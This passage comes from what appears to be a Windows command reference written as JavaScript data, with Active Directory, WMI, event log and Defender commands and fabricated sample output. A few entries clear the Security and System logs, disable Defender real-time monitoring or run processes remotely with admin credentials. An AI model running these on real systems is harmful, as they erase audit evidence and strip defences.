      { usage: 'setspn -Q MSSQLSvc/*', output: 'Checking domain DC=corp,DC=local\n    CN=SQL Service,CN=Users,DC=corp,DC=local\n        MSSQLSvc/sqlserver.corp.local:1433\n        MSSQLSvc/sqlserver.corp.local\n\nExisting SPN found!' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADUser -Filter * -Properties PasswordExpired,LockedOut',
    desc: 'Find locked-out and password-expired accounts in Active Directory',
    examples: [
      { usage: 'Get-ADUser -Filter {LockedOut -eq $true} -Properties LockedOut,LastBadPasswordAttempt | Select-Object Name,LockedOut,LastBadPasswordAttempt', output: 'Name        LockedOut LastBadPasswordAttempt\n----        --------- ----------------------\nJohn Smith  True      1/20/2024 9:05:00 AM' }
    ],
    category: 'AD'
  },

  // ============================================================
  // WMI (22 commands)
  // ============================================================
  {
    cmd: 'wmic process list brief',
    desc: 'List all running processes with process ID and priority via WMI',
    examples: [
      { usage: 'wmic process list brief', output: 'HandleCount  Name                 Priority  ProcessId  ThreadCount  WorkingSetSize\n0            System Idle Process   0         0          8            8192\n5765         System                8         4          197          143360\n47           smss.exe              11        348        2            1216512\n757          csrss.exe             13        472        12           5242880\n205          winlogon.exe          13        564        3            3145728\n1565         svchost.exe           8         804        28           26214400\n524          lsass.exe             9         660        10           15728640' },
      { usage: 'wmic process where "name=\'cmd.exe\'" get ProcessId,ParentProcessId,CommandLine', output: 'CommandLine                                    ParentProcessId  ProcessId\n"C:\\Windows\\system32\\cmd.exe"                   4520             7890\ncmd.exe /c whoami                               7890             8012\nC:\\Windows\\system32\\cmd.exe /K cd C:\\tools       4520             9234' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic startup list full',
    desc: 'List all auto-start programs configured via WMI',
    examples: [
      { usage: 'wmic startup list full', output: 'Caption=VMware User Process\nCommand="C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" -n vmusr\nLocation=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nName=VMware User Process\nUser=Public\n\nCaption=SecurityHealth\nCommand=%windir%\\system32\\SecurityHealthSystray.exe\nLocation=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nName=SecurityHealth\nUser=Public' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic share list brief',
    desc: 'List all shared resources on the system via WMI',
    examples: [
      { usage: 'wmic share list brief', output: 'Description          Name     Path            Type\nRemote Admin         ADMIN$   C:\\Windows      2147483648\nDefault share        C$       C:\\             2147483648\nRemote IPC           IPC$                     2147483651\nCompany shared folder Shared  C:\\Shared       0' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic nic list brief',
    desc: 'List network interface cards via WMI',
    examples: [
      { usage: 'wmic nic where "NetEnabled=true" list brief', output: 'Description                                   DeviceID  MACAddress         Manufacturer       Name                                   NetConnectionID\nIntel(R) 82574L Gigabit Network Connection    1         00:0C:29:A1:B2:C3  Intel Corporation  Intel(R) 82574L Gigabit Network Conn.  Ethernet0' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic qfe list brief',
    desc: 'List installed hotfixes and updates via WMI',
    examples: [
      { usage: 'wmic qfe list brief', output: 'Description  FixComments  HotFixID   InstalledBy          InstalledOn\nUpdate                    KB5034441  NT AUTHORITY\\SYSTEM  1/12/2024\nSecurity Update           KB5034122  NT AUTHORITY\\SYSTEM  1/9/2024\nUpdate                    KB5032392  NT AUTHORITY\\SYSTEM  12/15/2023\nSecurity Update           KB5031356  NT AUTHORITY\\SYSTEM  11/14/2023' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-WmiObject Win32_OperatingSystem',
    desc: 'PowerShell WMI query for detailed operating system information',
    examples: [
      { usage: 'Get-WmiObject Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture,LastBootUpTime,InstallDate', output: 'Caption        : Microsoft Windows 10 Pro\nVersion        : 10.0.19045\nBuildNumber    : 19045\nOSArchitecture : 64-bit\nLastBootUpTime : 20240115083022.500000-360\nInstallDate    : 20230710091500.000000-360' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-CimInstance Win32_Process',
    desc: 'Modern PowerShell CIM query for running processes',
    examples: [
      { usage: 'Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq (Get-Process -Name explorer).Id } | Select-Object Name,ProcessId,CommandLine', output: 'Name         ProcessId CommandLine\n----         --------- -----------\nchrome.exe   3412      "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"\ncmd.exe      7890      "C:\\Windows\\system32\\cmd.exe"\npowershell.exe 5678    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"' },
      { usage: 'Get-CimInstance Win32_Process -Filter "Name=\'lsass.exe\'" | Select-Object Name,ProcessId,CreationDate,CommandLine', output: 'Name      ProcessId CreationDate          CommandLine\n----      --------- ------------          -----------\nlsass.exe 660       1/15/2024 8:30:15 AM  C:\\Windows\\system32\\lsass.exe' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Invoke-WmiMethod',
    desc: 'Execute a WMI method remotely or locally via PowerShell',
    examples: [
      { usage: 'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\\temp\\out.txt"', output: 'ProcessId    ReturnValue  PSComputerName\n---------    -----------  --------------\n12345        0            WORKSTATION01' },
      { usage: 'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName DC01 -Credential CORP\\admin', output: 'ProcessId    ReturnValue  PSComputerName\n---------    -----------  --------------\n6789         0            DC01' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic product list brief',
    desc: 'List installed software products via WMI',
    examples: [
      { usage: 'wmic product get Name,Version,Vendor | findstr /i /v "^$"', output: 'Name                                           Vendor                    Version\nMicrosoft Visual C++ 2019 X64 Redistributable  Microsoft Corporation     14.29.30133\n7-Zip 23.01 (x64)                              Igor Pavlov               23.01\nPython 3.11.7 (64-bit)                         Python Software Foundation 3.11.7\nMicrosoft SQL Server 2019                      Microsoft Corporation     15.0.2000.5' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic shadowcopy list brief',
    desc: 'List Volume Shadow Copies via WMI',
    examples: [
      { usage: 'wmic shadowcopy list brief', output: 'DeviceObject                                    ID                                      InstallDate                VolumeName\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 {12345678-ABCD-EFGH-IJKL-123456789012} 20240115100000.000000-360  \\\\?\\Volume{abcdefgh-1234-5678-9012-abcdef123456}\\\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2 {23456789-BCDE-FGHI-JKLM-234567890123} 20240118100000.000000-360  \\\\?\\Volume{abcdefgh-1234-5678-9012-abcdef123456}\\' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-WmiObject Win32_LoggedOnUser',
    desc: 'List currently logged-on user sessions via WMI',
    examples: [
      { usage: 'Get-WmiObject Win32_LoggedOnUser | Select-Object -ExpandProperty Antecedent | Select-Object -Unique Domain,Name', output: 'Domain           Name\n------           ----\nCORP             admin\nNT AUTHORITY     SYSTEM\nNT AUTHORITY     LOCAL SERVICE\nNT AUTHORITY     NETWORK SERVICE\nWindow Manager   DWM-1' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-CimInstance Win32_NetworkAdapterConfiguration',
    desc: 'Query detailed network adapter configuration via CIM',
    examples: [
      { usage: 'Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled } | Select-Object Description,IPAddress,DefaultIPGateway,DNSServerSearchOrder,MACAddress', output: 'Description          : Intel(R) 82574L Gigabit Network Connection\nIPAddress            : {192.168.1.105, fe80::1234:5678:abcd:ef01}\nDefaultIPGateway     : {192.168.1.1}\nDNSServerSearchOrder : {192.168.1.10, 192.168.1.11}\nMACAddress           : 00:0C:29:A1:B2:C3' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic netuse list brief',
    desc: 'List mapped network drives via WMI',
    examples: [
      { usage: 'wmic netuse list brief', output: 'AccessMask  LocalName  RemoteName              Status\n1179785     Z:         \\\\fileserver\\share        OK\n1179785                \\\\dc01\\SYSVOL            OK' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-CimInstance Win32_StartupCommand',
    desc: 'List auto-start programs using CIM',
    examples: [
      { usage: 'Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User', output: 'Name                Command                                                    Location                                             User\n----                -------                                                    --------                                             ----\nSecurityHealth      %windir%\\system32\\SecurityHealthSystray.exe                 HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run   Public\nVMware User Process "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" -n vmusr HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run   Public\nOneDrive            "C:\\Users\\admin\\AppData\\Local\\...\\OneDrive.exe" /background HKU\\S-1-5-21-...\\SOFTWARE\\Microsoft\\Windows\\...\\Run    CORP\\admin' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-WmiObject Win32_PhysicalMemory',
    desc: 'Query physical memory modules via WMI',
    examples: [
      { usage: 'Get-WmiObject Win32_PhysicalMemory | Select-Object BankLabel,Capacity,Speed,Manufacturer', output: 'BankLabel  Capacity     Speed Manufacturer\n---------  --------     ----- ------------\nBANK 0     8589934592   3200  Samsung\nBANK 1     8589934592   3200  Samsung' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-CimInstance Win32_DiskDrive',
    desc: 'List physical disk drives via CIM',
    examples: [
      { usage: 'Get-CimInstance Win32_DiskDrive | Select-Object Model,Size,MediaType,InterfaceType', output: 'Model                    Size           MediaType            InterfaceType\n-----                    ----           ---------            -------------\nSamsung SSD 970 EVO Plus 256060514304   Fixed hard disk media NVMe\nSeagate ST500DM002       500105249792   Fixed hard disk media SATA' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic path Win32_ScheduledJob',
    desc: 'Query scheduled jobs via WMI',
    examples: [
      { usage: 'wmic path Win32_ScheduledJob get Caption,Command,DaysOfMonth,StartTime', output: 'Caption  Command                        DaysOfMonth  StartTime\nJob1     C:\\scripts\\backup.bat          4294967295   ********020000.000000-360' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-CimInstance Win32_LogonSession',
    desc: 'List active logon sessions via CIM',
    examples: [
      { usage: 'Get-CimInstance Win32_LogonSession | Where-Object { $_.LogonType -eq 10 } | Select-Object LogonId,LogonType,StartTime,AuthenticationPackage', output: 'LogonId  LogonType StartTime              AuthenticationPackage\n-------  --------- ---------              ---------------------\n1234567  10        1/20/2024 9:15:00 AM   Negotiate' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-CimInstance Win32_SecurityDescriptor',
    desc: 'Query security descriptors on WMI namespaces',
    examples: [
      { usage: 'Get-CimInstance -Namespace root -ClassName __Namespace | Select-Object Name', output: 'Name\n----\nsubscription\nDEFAULT\nCIMV2\nCli\nSecurityCenter2\nMicrosoft\nWMI\nrsop\nStandardCimv2\ndirectory' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic path Win32_UserProfile get LocalPath,SID,LastUseTime',
    desc: 'List user profiles with SIDs and last use time via WMI',
    examples: [
      { usage: 'wmic path Win32_UserProfile get LocalPath,SID,LastUseTime', output: 'LastUseTime                LocalPath                    SID\n20240120091500.000000-360   C:\\Users\\admin               S-1-5-21-...-1001\n20240118020000.000000-360   C:\\Users\\svcaccount          S-1-5-21-...-1002\n                            C:\\Users\\Default             S-1-5-18' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'Get-CimInstance -ClassName Win32_ComputerSystem',
    desc: 'Query overall computer system information via CIM',
    examples: [
      { usage: 'Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Name,Domain,DomainRole,Model,Manufacturer,TotalPhysicalMemory,UserName', output: 'Name                 : WORKSTATION01\nDomain               : corp.local\nDomainRole           : 1\nModel                : OptiPlex 7090\nManufacturer         : Dell Inc.\nTotalPhysicalMemory  : 17179869184\nUserName             : CORP\\admin' }
    ],
    category: 'WMI'
  },
  {
    cmd: 'wmic path AntiVirusProduct get displayName,productState,pathToSignedProductExe /namespace:\\\\root\\SecurityCenter2',
    desc: 'Query installed antivirus products via WMI SecurityCenter',
    examples: [
      { usage: 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState,pathToSignedProductExe', output: 'displayName               pathToSignedProductExe                                           productState\nWindows Defender          windowsdefender://                                               397568\nMalwarebytes              C:\\Program Files\\Malwarebytes\\Anti-Malware\\mbam.exe              266240' }
    ],
    category: 'WMI'
  },

  // ============================================================
  // EVENT LOG (22 commands)
  // ============================================================
  {
    cmd: 'wevtutil qe Security /c:10 /f:text /rd:true',
    desc: 'Query the last 10 events from the Security event log in text format',
    examples: [
      { usage: 'wevtutil qe Security /c:5 /f:text /rd:true', output: 'Event[0]:\n  Log Name: Security\n  Source: Microsoft-Windows-Security-Auditing\n  Date: 2024-01-20T09:15:00.000\n  Event ID: 4624\n  Task: Logon\n  Level: Information\n  Description: An account was successfully logged on.\n  Subject Security ID: S-1-5-18\n  Target Account Name: admin\n  Logon Type: 2\n  Source Network Address: -\n  Workstation Name: WORKSTATION01' },
      { usage: 'wevtutil qe Security /q:"*[System[EventID=4625]]" /c:5 /f:text /rd:true', output: 'Event[0]:\n  Log Name: Security\n  Source: Microsoft-Windows-Security-Auditing\n  Date: 2024-01-20T09:05:00.000\n  Event ID: 4625\n  Task: Logon\n  Level: Information\n  Description: An account failed to log on.\n  Target Account Name: admin\n  Failure Reason: Unknown user name or bad password.\n  Logon Type: 10\n  Source Network Address: 192.168.1.50' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'wevtutil el',
    desc: 'List all available event log channels',
    examples: [
      { usage: 'wevtutil el | findstr -i "security\\|system\\|application\\|powershell"', output: 'Application\nMicrosoft-Windows-PowerShell/Operational\nSecurity\nSystem\nWindows PowerShell' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'wevtutil gl Security',
    desc: 'Display configuration of a specific event log',
    examples: [
      { usage: 'wevtutil gl Security', output: 'name: Security\nenabled: true\ntype: Admin\nowningPublisher:\nisolation: Custom\nchannelAccess: O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)\nlogging:\n  logFileName: %SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx\n  retention: false\n  autoBackup: false\n  maxSize: 20971520\npublishing:' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'wevtutil cl Security',
    desc: 'Clear the Security event log (requires elevated privileges)',
    examples: [
      { usage: 'wevtutil cl Security', output: '' },
      { usage: 'wevtutil cl System', output: '' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'wevtutil epl Security C:\\temp\\security_backup.evtx',
    desc: 'Export an event log to an EVTX file for offline analysis',
    examples: [
      { usage: 'wevtutil epl Security C:\\temp\\security_backup.evtx', output: '' },
      { usage: 'wevtutil epl Security C:\\temp\\sec_filtered.evtx /q:"*[System[TimeCreated[@SystemTime>=\'2024-01-19T00:00:00\']]]"', output: '' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-EventLog -LogName Security -Newest 10',
    desc: 'PowerShell cmdlet to retrieve recent Security log entries',
    examples: [
      { usage: 'Get-EventLog -LogName Security -Newest 5', output: '   Index Time          EntryType   Source                 InstanceID Message\n   ----- ----          ---------   ------                 ---------- -------\n  156789 Jan 20 09:15  SuccessA... Microsoft-MDG-Sec...         4624 An account was successfully logged on...\n  156788 Jan 20 09:15  SuccessA... Microsoft-MDG-Sec...         4672 Special privileges assigned to new logon...\n  156787 Jan 20 09:05  FailureA... Microsoft-MDG-Sec...         4625 An account failed to log on...\n  156786 Jan 20 08:30  SuccessA... Microsoft-MDG-Sec...         4624 An account was successfully logged on...\n  156785 Jan 20 08:30  SuccessA... Microsoft-MDG-Sec...         4648 A logon was attempted using explicit credentials...' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -LogName Security -MaxEvents 10',
    desc: 'Modern PowerShell cmdlet to query Windows event logs',
    examples: [
      { usage: 'Get-WinEvent -LogName Security -MaxEvents 5 | Format-Table TimeCreated,Id,LevelDisplayName,Message -Wrap', output: 'TimeCreated          Id LevelDisplayName Message\n-----------          -- --------------- -------\n1/20/2024 9:15:00 AM 4624 Information    An account was successfully logged on.\n1/20/2024 9:15:00 AM 4672 Information    Special privileges assigned to new logon.\n1/20/2024 9:05:00 AM 4625 Information    An account failed to log on.\n1/20/2024 8:30:00 AM 4624 Information    An account was successfully logged on.\n1/20/2024 8:30:00 AM 4648 Information    A logon was attempted using explicit credentials.' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4624}',
    desc: 'Query successful logon events (Event ID 4624) from the Security log',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4624} -MaxEvents 3 | Select-Object TimeCreated,Id,Message', output: 'TimeCreated          Id Message\n-----------          -- -------\n1/20/2024 9:15:00 AM 4624 An account was successfully logged on. Subject: Security ID: S-1-5-18 Logon Type: 2 Account Name: admin Account Domain: CORP\n1/20/2024 8:30:00 AM 4624 An account was successfully logged on. Subject: Security ID: S-1-5-18 Logon Type: 3 Account Name: admin Account Domain: CORP\n1/19/2024 3:30:00 PM 4624 An account was successfully logged on. Subject: Security ID: S-1-5-18 Logon Type: 10 Account Name: jdoe Account Domain: CORP' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4625}',
    desc: 'Query failed logon events (Event ID 4625) for brute force detection',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4625} -MaxEvents 5 | Format-List TimeCreated,Message', output: 'TimeCreated : 1/20/2024 9:05:00 AM\nMessage     : An account failed to log on.\n              Subject:\n                Security ID: S-1-0-0\n              Logon Type: 10\n              Account For Which Logon Failed:\n                Account Name: admin\n                Account Domain: CORP\n              Failure Information:\n                Failure Reason: Unknown user name or bad password.\n                Status: 0xC000006D\n                Sub Status: 0xC000006A\n              Network Information:\n                Source Network Address: 192.168.1.50\n                Source Port: 49815' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4648}',
    desc: 'Query explicit credential logon events (Event ID 4648) for credential usage tracking',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4648} -MaxEvents 2 | Format-List TimeCreated,Message', output: 'TimeCreated : 1/20/2024 8:30:00 AM\nMessage     : A logon was attempted using explicit credentials.\n              Subject:\n                Account Name: admin\n                Account Domain: CORP\n              Account Whose Credentials Were Used:\n                Account Name: admin\n                Account Domain: CORP\n              Target Server:\n                Target Server Name: dc01.corp.local\n                Additional Information: ldap/dc01.corp.local' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4672}',
    desc: 'Query special privilege logon events (Event ID 4672) to track admin logons',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4672} -MaxEvents 2 | Format-List TimeCreated,Message', output: 'TimeCreated : 1/20/2024 9:15:00 AM\nMessage     : Special privileges assigned to new logon.\n              Subject:\n                Account Name: admin\n                Account Domain: CORP\n              Privileges:\n                SeSecurityPrivilege\n                SeBackupPrivilege\n                SeRestorePrivilege\n                SeDebugPrivilege\n                SeTakeOwnershipPrivilege\n                SeLoadDriverPrivilege\n                SeImpersonatePrivilege' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4688}',
    desc: 'Query process creation events (Event ID 4688) for command execution auditing',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4688} -MaxEvents 3 | Select-Object TimeCreated,@{N="Process";E={($_.Properties[5]).Value}} | Format-Table', output: 'TimeCreated              Process\n-----------              -------\n1/20/2024 9:15:30 AM     C:\\Windows\\System32\\cmd.exe\n1/20/2024 9:15:25 AM     C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n1/20/2024 9:15:20 AM     C:\\Windows\\System32\\whoami.exe' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4697}',
    desc: 'Query service installation events (Event ID 4697) for persistence detection',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4697} -MaxEvents 2 | Format-List TimeCreated,Message', output: 'TimeCreated : 1/18/2024 2:00:00 AM\nMessage     : A service was installed in the system.\n              Subject:\n                Account Name: admin\n                Account Domain: CORP\n              Service Information:\n                Service Name: MyService\n                Service File Name: C:\\tools\\myservice.exe\n                Service Type: 0x10\n                Service Start Type: 2\n                Service Account: LocalSystem' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4698}',
    desc: 'Query scheduled task creation events (Event ID 4698) for persistence detection',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4698} -MaxEvents 1 | Format-List TimeCreated,Message', output: 'TimeCreated : 1/19/2024 10:00:00 AM\nMessage     : A scheduled task was created.\n              Subject:\n                Account Name: admin\n                Account Domain: CORP\n              Task Information:\n                Task Name: \\Persistence\n                Task Content: <Task>...cmd.exe /c C:\\tools\\beacon.exe...</Task>' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4720}',
    desc: 'Query user account creation events (Event ID 4720)',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4720} -MaxEvents 1 | Format-List TimeCreated,Message', output: 'TimeCreated : 1/15/2024 3:00:00 PM\nMessage     : A user account was created.\n              Subject:\n                Account Name: admin\n                Account Domain: CORP\n              New Account:\n                Account Name: svcaccount\n                Account Domain: CORP\n                Security ID: S-1-5-21-3623811015-3361044348-30300820-1002' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="System";Id=7045}',
    desc: 'Query new service installation events (Event ID 7045) from the System log',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="System";Id=7045} -MaxEvents 3 | Format-List TimeCreated,Message', output: 'TimeCreated : 1/18/2024 2:00:00 AM\nMessage     : A service was installed in the system.\n              Service Name:  MyService\n              Service File Name:  C:\\tools\\myservice.exe\n              Service Type:  user mode service\n              Service Start Type:  auto start\n              Service Account:  LocalSystem\n\nTimeCreated : 1/10/2024 11:30:00 AM\nMessage     : A service was installed in the system.\n              Service Name:  SuspiciousSvc\n              Service File Name:  C:\\Users\\Public\\svc.exe\n              Service Type:  user mode service\n              Service Start Type:  auto start\n              Service Account:  LocalSystem' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"',
    desc: 'Query PowerShell operational log for script block and module logging',
    examples: [
      { usage: 'Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 5 | Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated,Message | Format-List', output: 'TimeCreated : 1/20/2024 9:15:30 AM\nMessage     : Creating Scriptblock text (1 of 1):\nGet-WinEvent -LogName Security -MaxEvents 10\n\nScriptBlock ID: 12345678-abcd-efgh-ijkl-123456789012\nPath:' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational";Id=1}',
    desc: 'Query Sysmon process creation events for detailed command line auditing',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational";Id=1} -MaxEvents 2 | Format-List TimeCreated,Message', output: 'TimeCreated : 1/20/2024 9:15:30 AM\nMessage     : Process Create:\nRuleName: -\nUtcTime: 2024-01-20 15:15:30.123\nProcessGuid: {12345678-ABCD-EFGH-IJKL-123456789012}\nProcessId: 7890\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.1\nCommandLine: cmd.exe /c whoami\nCurrentDirectory: C:\\Users\\admin\\\nUser: CORP\\admin\nLogonGuid: {12345678-1234-5678-9012-ABCDEF123456}\nLogonId: 0x12345\nTerminalSessionId: 1\nIntegrityLevel: High\nParentProcessGuid: {87654321-DCBA-HGFE-LKJI-210987654321}\nParentProcessId: 4520\nParentImage: C:\\Windows\\explorer.exe\nParentCommandLine: C:\\Windows\\Explorer.EXE' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational";Id=3}',
    desc: 'Query Sysmon network connection events for network activity monitoring',
    examples: [
      { usage: 'Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational";Id=3} -MaxEvents 2 | Format-List TimeCreated,Message', output: 'TimeCreated : 1/20/2024 9:16:00 AM\nMessage     : Network connection detected:\nRuleName: -\nUtcTime: 2024-01-20 15:16:00.456\nProcessGuid: {12345678-ABCD-EFGH-IJKL-234567890123}\nProcessId: 3412\nImage: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\nUser: CORP\\admin\nProtocol: tcp\nInitiated: true\nSourceIp: 192.168.1.105\nSourcePort: 49672\nDestinationIp: 40.90.189.152\nDestinationPort: 443\nDestinationHostname: login.microsoftonline.com' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -FilterXml',
    desc: 'Query event logs using XML filter for complex queries',
    examples: [
      { usage: 'Get-WinEvent -FilterXml \'<QueryList><Query Id="0"><Select Path="Security">*[System[(EventID=4624 or EventID=4625) and TimeCreated[timediff(@SystemTime) &lt;= 86400000]]]</Select></Query></QueryList>\' | Measure-Object', output: 'Count    : 47\nAverage  :\nSum      :\nMaximum  :\nMinimum  :\nProperty :' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'wevtutil qe "Windows PowerShell" /q:"*[System[EventID=400]]" /c:3 /f:text /rd:true',
    desc: 'Query PowerShell engine start events from the classic PowerShell log',
    examples: [
      { usage: 'wevtutil qe "Windows PowerShell" /q:"*[System[EventID=400]]" /c:2 /f:text /rd:true', output: 'Event[0]:\n  Log Name: Windows PowerShell\n  Source: PowerShell\n  Date: 2024-01-20T09:15:25.000\n  Event ID: 400\n  Task: Engine Lifecycle\n  Level: Information\n  Description: Engine state is changed from None to Available.\n  Details:\n    HostName=ConsoleHost\n    HostVersion=5.1.19041.3803\n    EngineVersion=5.1.19041.3803' }
    ],
    category: 'EventLog'
  },
  {
    cmd: 'Get-WinEvent -ListLog * | Where-Object { $_.RecordCount -gt 0 }',
    desc: 'List all event logs that contain recorded events',
    examples: [
      { usage: 'Get-WinEvent -ListLog * | Where-Object { $_.RecordCount -gt 0 } | Select-Object LogName,RecordCount,MaximumSizeInBytes | Sort-Object RecordCount -Descending | Select-Object -First 10', output: 'LogName                                        RecordCount MaximumSizeInBytes\n-------                                        ----------- ------------------\nSecurity                                       156789      20971520\nMicrosoft-Windows-Sysmon/Operational           98456       67108864\nSystem                                         45678       20971520\nApplication                                    23456       20971520\nMicrosoft-Windows-PowerShell/Operational       12345       15728640\nWindows PowerShell                             8901        15728640\nMicrosoft-Windows-TaskScheduler/Operational    6789        10485760' }
    ],
    category: 'EventLog'
  },

  // ============================================================
  // DEFENDER (18 commands)
  // ============================================================
  {
    cmd: 'Get-MpPreference',
    desc: 'Display Windows Defender configuration preferences',
    examples: [
      { usage: 'Get-MpPreference | Select-Object DisableRealtimeMonitoring,DisableBehaviorMonitoring,DisableIOAVProtection,DisableScriptScanning,ExclusionPath,ExclusionExtension,ExclusionProcess', output: 'DisableRealtimeMonitoring  : False\nDisableBehaviorMonitoring  : False\nDisableIOAVProtection      : False\nDisableScriptScanning      : False\nExclusionPath              : {C:\\Tools, C:\\Temp\\test}\nExclusionExtension         : {.log}\nExclusionProcess           : {vmtoolsd.exe}' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Set-MpPreference -DisableRealtimeMonitoring $true',
    desc: 'Disable Windows Defender real-time monitoring (requires admin)',
    examples: [
      { usage: 'Set-MpPreference -DisableRealtimeMonitoring $true', output: '' },
      { usage: 'Set-MpPreference -DisableRealtimeMonitoring $false', output: '' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Get-MpThreat',
    desc: 'List threats detected by Windows Defender',
    examples: [
      { usage: 'Get-MpThreat', output: 'CategoryID       : 8\nDidThreatExecute : False\nIsActive         : False\nResources        : {file:_C:\\Users\\admin\\Downloads\\mimikatz.exe}\nRollupStatus     : 33\nSchemaVersion    : 1.0.0.0\nSeverityID       : 5\nThreatID         : 2147723890\nThreatName       : HackTool:Win64/Mikatz!dha\nTypeID           : 0\nPSComputerName   :' }
    ],
    category: 'defender'
  },
  {
    cmd: 'Get-MpThreatDetection',
    desc: 'List recent threat detection events from Windows Defender',
    examples: [
      { usage: 'Get-MpThreatDetection', output: 'ActionSuccess              : True\nAdditionalActionsBitMask   : 0\nCleaningAction             : 9\nCurrentThreatExecutionStatus : 0\nDetectionID                : {12345678-ABCD-EFGH-IJKL-123456789012}\nDetectionSourceTypeID      : 1\nDomainUser                 : CORP\\admin\nInitialDetectionTime       : 1/18/2024 3:15:00 PM\nLastThreatStatusChangeTime : 1/18/2024 3:15:05 PM\nProcessName                : C:\\Users\\admin\\Downloads\\mimikatz.exe\nRemediationTime            : 1/18/2024 3:15:05 PM\nResources                  : {file:_C:\\Users\\admin\\Downloads\\mimikatz.exe}\nThreatID                   : 2147723890\nThreatStatusID             : 106' }
